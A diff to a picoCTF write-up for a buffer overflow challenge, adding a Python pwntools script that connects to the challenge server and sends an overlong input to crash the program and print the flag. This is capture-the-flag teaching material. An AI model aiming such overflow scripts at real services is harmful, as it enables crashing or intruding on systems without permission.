@@ -32,7 +32,25 @@ void vuln(char *input){
 When we insert a longer string than 16 (buf1 / input) and try to copy it we get a segmentation fault. This in turn calls sigsegv_handler and prints the flag.
 
 ## Solution
-With script:
+Python script:
+```python3
+#!/usr/bin/env python3
+
+from pwn import *
+import sys
+
+if len(sys.argv) != 2:
+    print("Usage: solve.py [input]")
+    exit(1)
+
+nc = remote("saturn.picoctf.net", 51110)
+nc.recvuntil(b"Input: ")
+nc.send(bytes("{}\n".format(sys.argv[1]), 'UTF-8'))
+print(nc.recvline().decode("UTF-8"))
+nc.close()
+```
+
+Bash script:
 ```bash
 #!/bin/bash
 echo "Any string longer than 16 characters" > message.txt
